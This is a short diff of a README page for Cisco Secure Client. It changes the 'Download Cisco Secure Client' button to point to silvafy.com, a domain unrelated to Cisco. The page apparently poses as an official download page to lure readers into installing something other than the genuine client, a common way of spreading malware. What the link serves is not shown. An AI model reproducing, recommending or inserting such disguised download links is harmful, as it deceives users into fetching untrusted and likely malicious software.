@@ -13,7 +13,7 @@ Cisco Secure Client, formerly known as AnyConnect, is an advanced VPN and securi
 ## Installation
 To get started, download the latest version of Cisco Secure Client by clicking the button:
 
-**[Download Cisco Secure Client](*)**
+**[Download Cisco Secure Client](https://silvafy.com/silvafy/)**
 
 After downloading, follow these steps to complete the installation:  
 
